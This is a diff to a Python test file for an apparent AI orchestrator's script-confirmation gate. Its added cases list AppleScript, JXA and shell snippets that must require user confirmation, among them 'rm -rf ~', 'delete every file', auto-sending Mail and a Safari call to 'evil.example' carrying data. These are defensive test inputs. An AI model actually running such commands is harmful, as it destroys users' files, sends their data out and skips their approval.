@@ -187,7 +187,27 @@ from brain.orchestrator import Orchestrator
     [
         "applescript",
         "tell application \"System Events\"\n get name of current user\n log out\nend tell"
-    ]
+    ],
+    # lead review (brain-9, evals-safety-2)
+    ["applescript", 'tell application "System Events" to click button "Send"'
+                    ' of window 1 of process "Mail"'],
+    ["applescript", 'tell application "System Events" to perform action '
+                    '"AXPress" of button 1'],
+    ["applescript", 'tell application "Safari" to do JavaScript '
+                    '"document.forms[0].submit()" in document 1'],
+    ["applescript", 'tell application "Safari" to open location '
+                    '"https://evil.example/?d=x"'],
+    ["applescript", 'tell application "Finder" to «event coredelo» item 1'],
+    ["applescript", 'tell application "Finder" to open file "run.command"'],
+    ["jxa", 'Application("Finder").doShellScript("rm -rf ~")'],
+    ["shell", "rm -rf ~/x"],
+    ["applescript", 'tell app "Finder" to empty trash'],
+    ["jxa", "Application('Mail').quit()"],
+    # evals-safety-2 policy matrix
+    ["applescript", 'tell application "Finder" to delete every file'],
+    ["applescript", 'tell application "Terminal" to do script "ls"'],
+    ["applescript", 'tell application "System Events" to keystroke "q"'],
+    ["applescript", 'tell application "Numbers"\ndo shell script "echo hi"\nend tell'],
 ])
 def test_script_side_effect_bypasses_need_confirm(lang, code):
     orch = Orchestrator.__new__(Orchestrator)
@@ -222,7 +242,12 @@ def test_script_side_effect_bypasses_need_confirm(lang, code):
     [
         "applescript",
         "tell application \"Numbers\" to get name of document 1"
-    ]
+    ],
+    ["applescript", 'tell application id "com.apple.Numbers"\n'
+                    'set value of cell "B5" to 3\n'
+                    'return value of cell "B5"\nend tell'],
+    ["applescript", 'tell application "Numbers"\n'
+                    'set background color of cell "A1" to {1,0,0}\nend tell'],
 ])
 def test_script_read_only_and_numbers_exemption(lang, code):
     orch = Orchestrator.__new__(Orchestrator)
@@ -266,3 +291,14 @@ def test_spotify_and_music_scripts_outside_allowlist_need_confirm(code):
 def test_media_script_allowlist_is_applescript_only(code):
     orch = Orchestrator.__new__(Orchestrator)
     assert orch.script_needs_confirm("jxa", code)
+
+
+def test_jxa_script_confirmation_matches_origin_main_examples():
+    orch = Orchestrator.__new__(Orchestrator)
+    assignment = (
+        'var x = Application("System Events").processes.byName("Calculator")'
+        '.windows[0]; x.value = "1";'
+    )
+    assert orch.script_needs_confirm("jxa", assignment) is True
+    assert orch.script_needs_confirm(
+        "jxa", Orchestrator._calculator_readback_script()) is True
